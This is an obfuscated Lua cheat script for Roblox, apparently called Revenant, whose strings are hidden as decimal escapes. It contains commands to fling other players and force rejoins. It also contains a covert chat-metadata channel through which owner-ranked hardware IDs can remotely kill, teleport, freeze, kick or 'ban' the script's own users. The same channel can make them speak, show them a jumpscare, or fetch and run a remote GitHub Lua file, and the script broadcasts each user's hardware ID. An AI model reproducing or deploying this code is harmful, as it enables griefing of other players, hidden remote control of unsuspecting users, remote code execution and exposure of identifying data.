 if _IIIlIlIIll then _IllIIlIIll:Notify({ Title = "\086\105\101\119\105\110\103", Content = _IIIlIlIIll.DisplayName, _IllIIlIlll = 0x3 }) _IlIIlIlIII = true _lIlIIIIlIl(_IIIlIlIIll) if _lIlIIIIIll then _lIlIIIIIll:Disconnect() _lIlIIIIIll = nil end
 _lIlIIIIIll = Players.PlayerRemoving:Connect( function (leavingPlayer) if leavingPlayer == _IIIlIlIIll then _IllIIlIIll:Notify({ Title = "\067\111\109\109\097\110\100\032\066\097\114", Content = "\085\110\118\105\101\119\105\110\103\046\046", _IllIIlIlll = 0x3 }) if _lIlIIIIIll then _lIlIIIIIll:Disconnect() _lIlIIIIIll = nil end
 _IlIIlIlIII = false _IIlllllIll = false _IllIlIIIII() end
 end
 ) end
 end
 ) _IIllllIIll("\117\110\118\105\101\119", {"\117\110\115\112\101\099\116\097\116\101"}, function (_lllIlllIIl) _IllIIlIIll:Notify({ Title = "\067\111\109\109\097\110\100\032\066\097\114", Content = "\085\110\118\105\101\119\105\110\103\046\046", _IllIIlIlll = 0x3 }) _IlIIlIlIII = false _IllIlIIIII() if _lIlIIIIIll then _lIlIIIIIll:Disconnect() _lIlIIIIIll = nil end
 end
 ) _IIllllIIll("\114\101\106\111\105\110", {"\114\106"}, function (_lllIlllIIl) local _IlIlIllllI = game:GetService("\084\101\108\101\112\111\114\116\083\101\114\118\105\099\101") local _IIIIllIIlI = game.PrivateServerId ~= '' or #Players:GetPlayers() <= 0x1 if _IIIIllIIlI then _llIIIlIIll:Kick("\082\101\106\111\105\110\105\110\103\046\046\046\046") task.wait() pcall( function () _IlIlIllllI:Teleport(game.PlaceId, _llIIIlIIll) end
 ) else _llIIIlIIll:Kick("\082\101\106\111\105\110\105\110\103\046\046\046\046") task.delay(0.1, function () pcall( function () _IlIlIllllI:TeleportToPlaceInstance(game.PlaceId, game.JobId, _llIIIlIIll) end
 ) end
 ) end
 end
 ) local function _IIIlIlllIl(_IIIlIlIIll) _IlIIllIIII[_IllIlIlIII(_IIIlIlIIll)] = _IIIlIlIIll return true end
 local function _IIIIlIIllI(others) for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll and ( not others or _IIIIIlIlll ~= _llIIIlIIll) then _IIIlIlllIl(_IIIIIlIlll) end
 end
 end
 _IIllllIIll("\102\108\105\110\103", {"\118\111\105\100"}, function (_lIlIllIlll) if not _lIlIllIlll[0x1] then return end
 if _IIllIlIlIl then return end
 local _IIIIlIIlII = _lIlIllIlll[0x1]:lower() local _IIllllllIl = {} if _IIIIlIIlII == "\097\108\108" or _IIIIlIIlII == "\111\116\104\101\114\115" then for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll then table.insert(_IIllllllIl, _IIIIIlIlll) end
 end
 else local _IIlIIllIIl = _lIllIIIllI(_lIlIllIlll[0x1]) if _IIlIIllIIl then table.insert(_IIllllllIl, _IIlIIllIIl) end
 end
 if #_IIllllllIl == 0x0 then return end
 local _llIIlllIlI = _IlIllIIllI.CmdFlingMethod and _IlIllIIllI.CmdFlingMethod.Value or "\086\111\105\100" task.spawn( function () for _lllIlllIIl, _IIIlIlIIll in ipairs(_IIllllllIl) do if not _IIIlIlIIll or not _IIIlIlIIll.Parent then continue end
 _IIllIlIlIl = true if not _IlIIlIlIII then _lIlIIIIlIl(_IIIlIlIIll) end
 _lIIIllllll(_IIIlIlIIll) _IIllIlIlIl = false if not _IlIIlIlIII then _IllIlIIIII() end
 end
 end
 ) end
 ) _IIllllIIll("\108\111\111\112\102\108\105\110\103", {"\108\111\111\112\118\111\105\100"}, function (_lIlIllIlll) if not _lIlIllIlll[0x1] then return end
 local _IIIIlIIlII = _lIlIllIlll[0x1]:lower() if _IIIIlIIlII == "\097\108\108" then _IllllllllI = "\097\108\108" for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll and _llIllIIlII(_IIIIIlIlll) then _IlIIllIIII[_IllIlIlIII(_IIIIIlIlll)] = _IIIIIlIlll end
 end
 elseif _IIIIlIIlII == "\111\116\104\101\114\115" then _IllllllllI = "\111\116\104\101\114\115" for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll ~= _llIIIlIIll and _llIllIIlII(_IIIIIlIlll) then _IlIIllIIII[_IllIlIlIII(_IIIIIlIlll)] = _IIIIIlIlll end
 end
 else _IllllllllI = "\115\105\110\103\108\101" local _IIIlIlIIll = _lIllIIIllI(_lIlIllIlll[0x1]) if not _IIIlIlIIll then return end
 if not _llIllIIlII(_IIIlIlIIll) then _IllIIlIIll:Notify({ Title = "\070\108\105\110\103", Content = _IIIlIlIIll.DisplayName .. "\032\105\115\032\110\111\116\032\105\110\032\116\104\101\032\109\097\112\046", _IllIIlIlll = 0x3 }) return end
 _IlIIllIIII[_IllIlIlIII(_IIIlIlIIll)] = _IIIlIlIIll end
 if not _IIllIlIlIl then _llIIIlllII() end
 end
 ) _IIllllIIll("\117\110\102\108\105\110\103", {"\117\110\118\111\105\100", "\117\110\108\111\111\112\102\108\105\110\103", "\117\110\108\111\111\112\118\111\105\100"}, function (_lIlIllIlll) if not _lIlIllIlll[0x1] then _IllllllllI = nil _IlIIllIIII = {} _IIIIIlIIII() return end
 local _IIIIlIIlII = _lIlIllIlll[0x1]:lower() if _IIIIlIIlII == "\097\108\108" or _IIIIlIIlII == "\111\116\104\101\114\115" then _IllllllllI = nil _IlIIllIIII = {} _IIIIIlIIII() else local _IIIlIlIIll = _lIllIIIllI(_lIlIllIlll[0x1]) if _IIIlIlIIll then _IlIIllIIII[_IllIlIlIII(_IIIlIlIIll)] = nil end
 if not next(_IlIIllIIII) then _IllllllllI = nil _IIIIIlIIII() end
 end
 end
 ) _IIllllIIll("\114\101\115\101\116", nil, function (_lllIlllIIl) pcall( function () replicatesignal(game.Players.LocalPlayer.Kill) end
 ) end
 ) _IIllllIIll("\102\105\120\099\097\109", nil, function (_lllIlllIIl) local _IIllllIlII = _llIIIlIIll.Character local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IIllllIlII and _IlIIIlIIII and workspace.CurrentCamera then local _IIIIllllII = workspace.CurrentCamera.CFrame workspace.CurrentCamera:Destroy() local _IIlIllIllI = Instance.new("\067\097\109\101\114\097", workspace) _IIlIllIllI.CameraType = Enum.CameraType.Custom _IIlIllIllI.CameraSubject = _IlIIIlIIII _IIlIllIllI.CFrame = _IIIIllllII _llIIIlIIll.CameraMode = Enum.CameraMode.Classic end
 end
 ) RevenantWhitelist = RevenantWhitelist or {} _IIllllIIll("\119\104\105\116\101\108\105\115\116", {"\097\100\100\119\104\105\116\101\108\105\115\116"}, function (_lIlIllIlll) local _IIIlIlIIll = _lIllIIIllI(_lIlIllIlll[0x1]) if not _IIIlIlIIll then return end
 if table.find(RevenantWhitelist, _IIIlIlIIll) then _IllIIlIIll:Notify({Title = "\087\104\105\116\101\108\105\115\116", Content = _IIIlIlIIll.DisplayName .. "\032\105\115\032\097\108\114\101\097\100\121\032\119\104\105\116\101\108\105\115\116\101\100\046", _IllIIlIlll = 0x3}) else table.insert(RevenantWhitelist, _IIIlIlIIll) _IllIIlIIll:Notify({Title = "\087\104\105\116\101\108\105\115\116", Content = "\087\104\105\116\101\108\105\115\116\101\100\032" .. _IIIlIlIIll.DisplayName, _IllIIlIlll = 0x3}) end
 end
 ) _IIllllIIll("\117\110\119\104\105\116\101\108\105\115\116", {"\114\101\109\111\118\101\119\104\105\116\101\108\105\115\116"}, function (_lIlIllIlll) local _IIIlIlIIll = _lIllIIIllI(_lIlIllIlll[0x1]) if not _IIIlIlIIll then return end
 local _lIllIIIIII = table.find(RevenantWhitelist, _IIIlIlIIll) if _lIllIIIIII then table.remove(RevenantWhitelist, _lIllIIIIII) _IllIIlIIll:Notify({Title = "\087\104\105\116\101\108\105\115\116", Content = "\085\110\119\104\105\116\101\108\105\115\116\101\100\032" .. _IIIlIlIIll.DisplayName, _IllIIlIlll = 0x3}) end
 end
 ) _llllllIlIl = {} _RCS_MyRank = 0x63 do _RCS_Prefix = "\082\067\083\095" _RCS_Channel = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101").TextChannels.RBXGeneral _RCS_RankMap = { ["\101\053\048\052\052\050\051\100\051\097\054\050\051\101\051\051\055\097\101\099\049\097\049\054\054\051\102\098\051\057\054\055\101\048\053\056\100\051\052\054\053\050\101\051\101\101\101\054\098\101\052\102\056\051\098\051\102\100\048\097\048\099\101\100\052\097\100\102\051\054\051\054\052\048\054\100\101\054\050\048\099\053\097\100\051\055\052\055\055\101\048\048\055\050\050\050\053\054\054\057\048\097\050\057\097\048\099\101\051\057\053\099\050\102\055\098\102\097\098\101\056\055\049\055\049\099\048\053"] = 0x1, ["\049\056\053\050\098\050\051\049\055\101\050\057\100\101\049\051\050\099\097\101\098\053\051\053\052\099\052\098\098\097\097\053\049\102\100\052\097\053\055\056\053\050\050\098\102\050\101\051\100\053\048\051\055\048\053\100\101\097\053\055\057\057\055\054"] = 0x2, ["\051\057\054\052\054\054\051\050\051\051\051\051\051\054\054\051\054\049\054\054\051\051\051\055\054\050\051\053\054\051\054\054\051\054\054\052\051\049\051\053\051\054\051\055\054\051\051\050\051\054\054\049\051\049\051\053\051\048\051\056\054\054\051\056\054\049\051\050\054\050\054\053\051\048\054\052\054\054\054\049\054\050\051\052\051\055\051\053\051\056\051\052\051\057\054\050\054\052\051\052\051\057\054\049\051\055\051\049\051\054\054\050\051\052\054\049\054\049\051\050\054\052\051\049\054\049\051\057"] = 0x2, ["\054\102\101\048\097\099\057\055\052\057\057\100\098\051\051\051\099\049\101\097\057\102\099\051\055\098\097\049\100\097\099\056\049\053\055\054\051\051\055\102\051\056\100\050\100\102\048\053\049\051\099\048\050\051\102\052\053\052\098\049\049\057\048\102"] = 0x2, ["\049\097\097\097\053\099\055\050\101\052\101\049\097\050\057\055\097\057\051\056\052\100\051\050\098\048\056\050\049\057\056\057\051\101\101\053\051\101\056\101\102\098\048\051\102\052\049\102\100\054\098\057\054\048\056\051\057\099\097\097\102\099\051\098"] = 0x3, ["\053\054\097\100\056\048\057\102\098\057\051\054\098\057\056\052\099\055\051\100\100\050\097\100\099\102\099\098\049\056\057\056\053\055\050\052\099\049\053\054\056\055\097\100\051\100\055\055\053\055\053\055\102\057\048\056\054\098\102\057\097\054\056\057\055\098\097\052\100\054\048\050\057\054\051\056\057\048\049\098\051\098\102\097\051\054\052\102\102\049\048\051\057\051\051\054\051\097\048\102\055\052\098\101\056\050\099\055\097\055\054\052\099\057\048\052\101\102\102\052\050\101\049\057\048\051\054\098"] = 0x3, ["\053\050\056\098\057\098\102\048\102\099\056\101\053\054\056\097\054\098\052\101\102\100\048\100\099\048\057\102\053\049\051\098\057\050\100\049\052\057\100\099\100\098\102\052\102\052\097\053\048\098\099\050\054\050\056\057\100\101\055\102\102\050\100\056"] = 0x3, ["\099\050\049\057\048\097\098\052\101\056\048\049\051\050\049\055\048\051\100\051\054\050\101\052\054\057\055\056\054\048\056\098\051\055\056\048\057\102\102\098\053\052\101\057\097\098\049\099\052\050\052\049\057\056\097\049\100\048\048\098\049\049\099\097"] = 0x3, ["\054\102\097\056\055\102\100\056\101\057\048\056\055\098\052\098\053\099\048\053\050\098\048\101\051\048\056\101\050\101\054\051\054\057\051\051\056\052\048\054\050\097\102\048\050\101\101\055\054\051\050\053\101\097\101\101\056\097\054\099\057\100\102\052"] = 0x3, ["\054\101\051\102\049\049\057\098\056\048\097\101\050\053\099\098\102\048\099\051\053\057\053\055\050\101\050\102\054\051\050\101\102\056\053\099\099\098\097\056\097\054\100\102\057\097\100\056\049\100\050\054\053\052\052\054\099\100\102\102\101\100\054\100"] = 0x3, ["\057\049\048\048\057\056\051\051\052\097\049\051\101\057\100\050\048\101\054\099\055\100\053\101\054\098\053\052\099\099\055\050\052\051\056\051\048\052\057\048\055\050\100\054\048\051\052\097\052\057\050\049\057\050\101\101\101\101\100\098\049\049\051\055"] = 0x3, ["\055\053\101\051\098\055\099\057\100\102\054\054\102\057\102\053\097\098\050\048\051\054\051\100\051\056\051\098\052\099\053\101\052\049\053\097\051\049\102\050\052\054\052\052\049\057\057\101\051\098\049\055\053\057\097\048\052\102\055\055\056\098\097\056"] = 0x3, ["\057\053\098\055\050\056\055\057\050\097\057\101\052\052\102\049\056\048\100\055\057\052\051\097\100\097\050\102\051\057\098\056\054\100\049\053\102\048\098\102\057\097\099\097\056\051\052\052\056\101\051\051\056\053\097\102\098\100\102\048\057\053\100\053"] = 0x3 } _IlIlIIIlII = { [0x1] = "\079\119\110\101\114", [0x2] = "\067\111\045\079\119\110\101\114", [0x3] = "\084\114\117\115\116\101\100" } _lllIlllIlI = function (_lIIIlIIlIl) return _RCS_RankMap[_lIIIlIIlIl:lower()] or 0x63 end
 _RCS_MyHWID = "" pcall( function () if gethwid then _RCS_MyHWID = gethwid() end
 end
 ) _RCS_MyRank = _lllIlllIlI(_RCS_MyHWID) _RCS_SessionToken = tostring(math.random(0x186A0, 0xF423F)) _RCS_Send = function (_IlIIllIlII, _IllIlIIIIl) local _IIIlIlIlIl = _RCS_Prefix .. _IlIIllIlII .. "\124" .. _RCS_MyHWID .. "\124" .. _RCS_SessionToken .. "\124" .. (_IllIlIIIIl or "") pcall( function () _RCS_Channel:SendAsync("", _IIIlIlIlIl) end
 ) end
 _RCS_AnchorConn = nil _RCS_ExecuteOnSelf = function (_IllIIIlIll, _IllIlIIIIl) local _IIllllIlII = _llIIIlIIll.Character local _llIIlIIlII = _IIllllIlII and _IIllllIlII:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") local _IlIIIlIIII = _IIllllIlII and _IIllllIlII:FindFirstChildOfClass("\072\117\109\097\110\111\105\100") if _IllIIIlIll == "\098\114\105\110\103" then if _llIIlIIlII and _IllIlIIIIl ~= "" then local _llIIIlIlll, ay, az, bx, by, bz = _IllIlIIIIl:match( "\094\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\036") if _llIIIlIlll then local _IllIlIllIl = Vector3.new(tonumber(_llIIIlIlll), tonumber(ay), tonumber(az)) local _IIIlllIIlI = Vector3.new(tonumber(bx), tonumber(by), tonumber(bz)) _llIIlIIlII.CFrame = CFrame.lookAt(_IllIlIllIl, _IIIlllIIlI) else local _IIIIlllIII, y, z = _IllIlIIIIl:match("\094\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\044\040\037\045\063\091\037\100\037\046\093\043\041\036") if _IIIIlllIII then _llIIlIIlII.CFrame = CFrame.new(tonumber(_IIIIlllIII), tonumber(y), tonumber(z)) end
 end
 end
 elseif _IllIIIlIll == "\107\105\108\108" then if typeof(replicatesignal) == "\102\117\110\099\116\105\111\110" then pcall( function () replicatesignal(_llIIIlIIll.Kill) end
 ) elseif _IlIIIlIIII then _IlIIIlIIII.Health = 0x0 end
 elseif _IllIIIlIll == "\097\110\099\104\111\114" then if _RCS_AnchorConn then _RCS_AnchorConn:Disconnect() _RCS_AnchorConn = nil end
 local _IlIlIlIIll = _llIIlIIlII and _llIIlIIlII.CFrame or CFrame.new(0x0, 0x5, 0x0) _RCS_AnchorConn = RunService.Heartbeat:Connect( function () local _IIIlIlllll = _llIIIlIIll.Character local _IlIIIIIIll = _IIIlIlllll and _IIIlIlllll:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlIIIIIIll then _IlIIIIIIll.CFrame = _IlIlIlIIll _IlIIIIIIll.AssemblyLinearVelocity = Vector3.zero _IlIIIIIIll.AssemblyAngularVelocity = Vector3.zero pcall( function () _IlIIIIIIll.Velocity = Vector3.zero end
 ) pcall( function () _IlIIIIIIll.RotVelocity = Vector3.zero end
 ) end
 end
 ) elseif _IllIIIlIll == "\117\110\097\110\099\104\111\114" then if _RCS_AnchorConn then _RCS_AnchorConn:Disconnect() _RCS_AnchorConn = nil end
 elseif _IllIIIlIll == "\115\111\110\105\099" then if not getgenv().RevenantSonicExecuted then getgenv().RevenantSonicExecuted = true pcall( function () loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\114\097\119\046\103\105\116\104\117\098\117\115\101\114\099\111\110\116\101\110\116\046\099\111\109\047\114\097\122\101\099\111\109\115\111\110\111\047\082\101\118\101\110\097\110\116\047\114\101\102\115\047\104\101\097\100\115\047\109\097\105\110\047\083\111\110\105\099\046\108\117\097"))() end
 ) end
 pcall( function () if getgenv().RevenantCleanup then getgenv().RevenantCleanup() else if _IllIIlIIll then _IllIIlIIll:Unload() end
 end
 getgenv().RevenantLoaded = false getgenv().RevenantCleanup = nil end
 ) elseif _IllIIIlIll == "\098\097\110" then if _IIllllIlII then pcall( function () shared.ismobile = false end
 ) pcall( function () shared.isconsole = true end
 ) pcall( function () _IIllllIlII:SetAttribute("\109\111\098\105\108\101", false) end
 ) pcall( function () _IIllllIlII:SetAttribute("\099\111\110\115\111\108\101", true) end
 ) local _llIIlllIll = _IIllllIlII:FindFirstChild("\067\111\109\109\117\110\105\099\097\116\101") or _IIllllIlII:WaitForChild("\067\111\109\109\117\110\105\099\097\116\101", 0x1) if _llIIlllIll then pcall( function () _llIIlllIll:FireServer({ Goal = "\080\108\097\116\102\111\114\109", mobile = false }) end
 ) pcall( function () _llIIlllIll:FireServer({ Goal = "\080\108\097\116\102\111\114\109", console = true }) end
 ) pcall( function () _llIIlllIll:FireServer({ Goal = "\032\080\108\097\116\102\111\114\109\032", mobile = false }) end
 ) end
 end
 elseif _IllIIIlIll == "\107\105\099\107" then _llIIIlIIll:Kick(_IllIlIIIIl ~= "" and _IllIlIIIIl or "\091\082\067\083\093\032\089\111\117\032\119\101\114\101\032\107\105\099\107\101\100\046") elseif _IllIIIlIll == "\117\110\108\111\097\100" then pcall( function () if getgenv().RevenantCleanup then getgenv().RevenantCleanup() else _IllIIlIIll:Unload() end
 end
 ) elseif _IllIIIlIll == "\115\097\121" then pcall( function () local _IIllllIlII = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101").TextChannels:FindFirstChild("\082\066\088\071\101\110\101\114\097\108") if _IIllllIlII then _IIllllIlII:SendAsync(_IllIlIIIIl) end
 end
 ) elseif _IllIIIlIll == "\110\111\116\105\102\121" then _IllIIlIIll:Notify({ Title = _lIllIllIII("\046\046\046"), Content = _IllIlIIIIl, _IllIIlIlll = 0x6 }) elseif _IllIIIlIll == "\106\117\109\112\115\099\097\114\101" then task.spawn( function () local _lIIlIlllll = game:GetService("\067\111\114\101\071\117\105") local _IllIlIIllI = Instance.new("\083\111\117\110\100", _lIIlIlllll) _IllIlIIllI.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\053\051\051\050\049\052\054\054\053\051" _IllIlIIllI.Volume = 0xA _IllIlIIllI.PlaybackSpeed = 0x3 _IllIlIIllI:Play() _IllIlIIllI.Ended:Wait() _IllIlIIllI:Destroy() local _IlllIllllI = Instance.new("\083\099\114\101\101\110\071\117\105", _lIIlIlllll) _IlllIllllI.IgnoreGuiInset = true _IlllIllllI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling local _lIIlllIlll = Instance.new("\073\109\097\103\101\076\097\098\101\108", _IlllIllllI) _lIIlllIlll.BackgroundTransparency = 0x1 _lIIlllIlll.BorderSizePixel = 0x0 _lIIlllIlll.Position = UDim2.new(0x0, 0x0, 0x0, 0x0) _lIIlllIlll.Size = UDim2.new(0x1, 0x0, 0x1, 0x0) _lIIlllIlll.Image = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\055\048\048\054\052\053\053\056\050\053" local _llllllIIIl = Instance.new("\083\111\117\110\100", _lIIlIlllll) _llllllIIIl.SoundId = "\114\098\120\097\115\115\101\116\105\100\058\047\047\049\051\051\050\054\052\052\050\056\057" _llllllIIIl.Volume = 0xA _llllllIIIl:Play() _llllllIIIl.Ended:Wait() _IlllIllllI:Destroy() _llllllIIIl:Destroy() end
 ) elseif _IllIIIlIll == "\098\101\109\121\115\116\097\110\100" then if _IllIlIIIIl ~= "" then local _IIIlIlIIll for _lllIlllIIl, _IIIIIlIlll in pairs(Players:GetPlayers()) do if _IIIIIlIlll.Name == _IllIlIIIIl or _IIIIIlIlll.DisplayName == _IllIlIIIIl then _IIIlIlIIll = _IIIIIlIlll break end
 end
 if _IIIlIlIIll and getgenv()._standActivateFn then getgenv()._standActivateFn(_IIIlIlIIll) pcall( function () _IlIllIIllI.StandTargetDropdown:SetDisabled(true) end
 ) pcall( function () _IlIllIIllI.StandMethodDropdown:SetDisabled(true) end
 ) end
 end
 elseif _IllIIIlIll == "\115\116\111\112\098\101\105\110\103\109\121\115\116\097\110\100" then if getgenv()._standDeactivateFn then getgenv()._standDeactivateFn() end
 pcall( function () _IlIllIIllI.StandTargetDropdown:SetDisabled(false) end
 ) pcall( function () _IlIllIIllI.StandMethodDropdown:SetDisabled(false) end
 ) end
 end
 _RCS_SendCmd = function (_IllIIIlIll, _IIlIllIllI) if _RCS_MyRank == 0x63 then return end
 local _IllIlIIIIl = tostring(_IIlIllIllI.UserId) if _IllIIIlIll == "\098\114\105\110\103" then local _IlIIIIIIll = _llIIIlIIll.Character and _llIIIlIIll.Character:FindFirstChild("\072\117\109\097\110\111\105\100\082\111\111\116\080\097\114\116") if _IlIIIIIIll then local _lIllIIIIIl = _IlIIIIIIll.CFrame * CFrame.new(0x0, 0x0, -0x3) _IllIlIIIIl = _IllIlIIIIl .. "\044" .. string.format("\037\046\051\102\044\037\046\051\102\044\037\046\051\102\044\037\046\051\102\044\037\046\051\102\044\037\046\051\102", _lIllIIIIIl.X, _lIllIIIIIl.Y, _lIllIIIIIl.Z, _IlIIIIIIll.Position.X, _IlIIIIIIll.Position.Y, _IlIIIIIIll.Position.Z) end
 end
 _RCS_Send("\067\077\068\058" .. _IllIIIlIll, _IllIlIIIIl) end
 _RCS_MsgConn = game:GetService("\084\101\120\116\067\104\097\116\083\101\114\118\105\099\101").MessageReceived:Connect( function (_lIllIIIIll) local _IIIlIlIlIl = _lIllIIIIll.Metadata local _lIlIlIllII = _lIllIIIIll.TextSource if not _IIIlIlIlIl or not _lIlIlIllII then return end
 if _lIlIlIllII.UserId == _llIIIlIIll.UserId then return end
 if _IIIlIlIlIl:sub(0x1, #_RCS_Prefix) ~= _RCS_Prefix then return end
 local _IllllllIll = Players:GetPlayerByUserId(_lIlIlIllII.UserId) if not _IllllllIll then return end
 local _IIIIllIlll = _IIIlIlIlIl:sub(#_RCS_Prefix + 0x1) local _IlIIllIlII, _lIIIlIIlIl, token, _IllIlIIIIl = _IIIIllIlll:match("\094\040\091\094\124\093\043\041\124\040\091\094\124\093\042\041\124\040\091\094\124\093\042\041\124\063\040\046\042\041\036") if not _IlIIllIlII or not _lIIIlIIlIl then return end
 local _llIllIIIlI = _lllIlllIlI(_lIIIlIIlIl) if _IlIIllIlII == "\100\105\115\099\111\110" then _llllllIlIl[_lIlIlIllII.UserId] = nil return end
 if _IlIIllIlII == "\105\110\105\116\032\105\032\115\117\112\112\111\114\116\032\104\111\111\107\115" or _IlIIllIlII == "\105\110\105\116\032\105\032\100\111\110\116\032\115\117\112\112\111\114\116\032\104\111\111\107\115" then local _lIIlIIIIlI = (_IlIIllIlII == "\105\110\105\116\032\105\032\115\117\112\112\111\114\116\032\104\111\111\107\115") local _IIIIIllIll = _llllllIlIl[_lIlIlIllII.UserId] local _IIIIllIIIl = not _IIIIIllIll or (_IIIIIllIll.token ~= token) _llllllIlIl[_lIlIlIllII.UserId] = { _lllIIlllll = _IllllllIll, _lIIIlIIlIl = _lIIIlIIlIl, rank = _llIllIIIlI, token = token, _lIIlIIIIlI = _lIIlIIIIlI } if _IIIIllIIIl then if typeof(hookfunction) == "\102\117\110\099\116\105\111\110" then _RCS_Send("\105\110\105\116\032\105\032\115\117\112\112\111\114\116\032\104\111\111\107\115") else _RCS_Send("\105\110\105\116\032\105\032\100\111\110\116\032\115\117\112\112\111\114\116\032\104\111\111\107\115") end
 if _RCS_MyRank <= 0x3 then _IllIIlIIll:Notify({ Title = _lIllIllIII("\067\111\109\109\097\110\100\032\098\097\114"), Content = "\084\114\117\115\116\101\100\032\099\111\110\110\101\099\116\101\100\032\119\105\116\104\032" .. _IllllllIll.DisplayName .. "\032\040\064" .. _IllllllIll.Name .. "\041\044\032\101\120\116\114\097\032\099\111\109\109\097\110\100\115\032\097\114\101\032\097\118\097\105\108\097\098\108\101\044\032\105\102\032\121\111\117\032\097\114\101\032\104\105\103\104\101\114\032\116\104\097\110\032\104\105\109\046", _IllIIlIlll = 0x6 }) end
 end
 return end
 if _IlIIllIlII:sub(0x1, 0x4) == "\067\077\068\058" then local _IllIIIlIll = _IlIIllIlII:sub(0x5) local _IlIlllIlII = _IllIlIIIIl:split("\044") local _IIIlIIlIlI = _IlIlllIlII[0x1] if tostring(_llIIIlIIll.UserId) ~= _IIIlIIlIlI then return end
 if _llIllIIIlI == 0x63 then return end
 if _IllIIIlIll == "\098\097\110" and _llIllIIIlI ~= 0x1 then _RCS_Send("\067\077\068\058\110\111\116\105\102\121", tostring(_lIlIlIllII.UserId) .. "\044\078\111\032\112\101\114\109\105\115\115\105\111\110\115\046") return end
 if _llIllIIIlI >= _RCS_MyRank then _RCS_Send("\067\077\068\058\110\111\116\105\102\121", tostring(_lIlIlIllII.UserId) .. "\044\078\111\032\112\101\114\109\105\115\115\105\111\110\115\046") return end
 local _lllIllllIl = "" if _IllIIIlIll == "\098\114\105\110\103" and #_IlIlllIlII >= 0x7 then _lllIllllIl = _IlIlllIlII[0x2] .. "\044" .. _IlIlllIlII[0x3] .. "\044" .. _IlIlllIlII[0x4] .. "\044" .. _IlIlllIlII[0x5] .. "\044" .. _IlIlllIlII[0x6] .. "\044" .. _IlIlllIlII[0x7] elseif _IllIIIlIll == "\107\105\099\107" and #_IlIlllIlII >= 0x2 then _lllIllllIl = table.concat(_IlIlllIlII, "\044", 0x2) elseif _IllIIIlIll == "\115\097\121" and #_IlIlllIlII >= 0x2 then _lllIllllIl = table.concat(_IlIlllIlII, "\044", 0x2) elseif _IllIIIlIll == "\110\111\116\105\102\121" and #_IlIlllIlII >= 0x2 then _lllIllllIl = table.concat(_IlIlllIlII, "\044", 0x2) elseif _IllIIIlIll == "\098\101\109\121\115\116\097\110\100" then _lllIllllIl = _IllllllIll.Name end
 _RCS_ExecuteOnSelf(_IllIIIlIll, _lllIllllIl) end
 end
 ) getgenv()._tsb_getRevTargets = function (_llIlIlIIll) local _IlIIIllIII = _llIlIlIIll:lower() if _IlIIIllIII == "\097\108\108" or _IlIIIllIII == "\111\116\104\101\114\115" then local _IIlIIIllII = {} for _lllIlllIIl, _IIIlIlIlIl in pairs(_llllllIlIl) do if _IIIlIlIlIl.player and _IIIlIlIlIl.player.Parent then table.insert(_IIlIIIllII, _IIIlIlIlIl.player) end
 end
 return _IIlIIIllII end
 for _lllIlllIIl, _IIIlIlIlIl in pairs(_llllllIlIl) do local _IIIIIlIlll = _IIIlIlIlIl.player if _IIIIIlIlll and _IIIIIlIlll.Parent then if _IIIIIlIlll.Name:lower():sub(0x1, #_IlIIIllIII) == _IlIIIllIII or _IIIIIlIlll.DisplayName:lower():sub(0x1, #_IlIIIllIII) == _IlIIIllIII then return { _IIIIIlIlll } end
 end
 end
 return nil end
 getgenv()._tsb_RCS_Cmd = function (_IlIllIIlIl, aliases, extraBuilder) _IIllllIIll(_IlIllIIlIl, aliases, function (_lIlIllIlll) local _IIllllllIl = getgenv()._tsb_getRevTargets(_lIlIllIlll[0x1] or "") if not _IIllllllIl or #_IIllllllIl == 0x0 then _IllIIlIIll:Notify({ Title = _lIllIllIII("\067\111\109\109\097\110\100\032\098\097\114"), Content = "\084\104\101\114\101\115\032\110\111\032\114\101\118\101\110\097\110\116\032\117\115\101\114\032\104\101\114\101\046", _IllIIlIlll = 0x3 }) return end
 for _lllIlllIIl, _IIIlIlIIll in ipairs(_IIllllllIl) do if extraBuilder then local _IllIlIIIIl = extraBuilder(_IIIlIlIIll, _lIlIllIlll) if _IllIlIIIIl ~= nil then _RCS_Send("\067\077\068\058" .. _IlIllIIlIl, _IllIlIIIIl) end
 else _RCS_SendCmd(_IlIllIIlIl, _IIIlIlIIll) end
 end
 end
 ) end
 if _RCS_MyRank <= 0x3 then getgenv()._tsb_RCS_Cmd("\098\114\105\110\103") getgenv()._tsb_RCS_Cmd("\107\105\108\108") getgenv()._tsb_RCS_Cmd("\097\110\099\104\111\114") getgenv()._tsb_RCS_Cmd("\117\110\097\110\099\104\111\114") getgenv()._tsb_RCS_Cmd("\115\111\110\105\099") getgenv()._tsb_RCS_Cmd("\117\110\108\111\097\100") if _RCS_MyRank == 0x1 then getgenv()._tsb_RCS_Cmd("\098\097\110") end
